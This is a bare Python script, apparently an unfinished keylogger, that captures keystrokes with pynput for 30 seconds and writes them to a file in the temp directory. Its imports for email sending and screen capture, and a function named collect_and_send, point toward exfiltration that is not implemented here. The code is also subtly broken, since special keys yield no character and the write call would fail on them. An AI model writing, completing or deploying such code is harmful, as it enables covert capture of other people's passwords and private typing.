import smtplib
import tempfile
from pathlib import Path
from email.message import EmailMessage
from pynput.keyboard import Listener
from PIL import ImageGrab

class Recorder:
    def __init__(self, target):
        self.target = target

    def receive(self, event):
        value = event.char
        self.save(value)

    def save(self, value):
        with open(self.target, 'a', encoding='utf-8') as output:
            output.write(value)


def collect_and_send():
    stage = Path(tempfile.gettempdir())
    log = stage / 'input.txt'
    recorder = Recorder(log)
    listener = Listener(on_press=recorder.receive)
    listener.start()
    listener.join(30)
    listener.stop()

if __name__ == "__main__":
    collect_and_send()
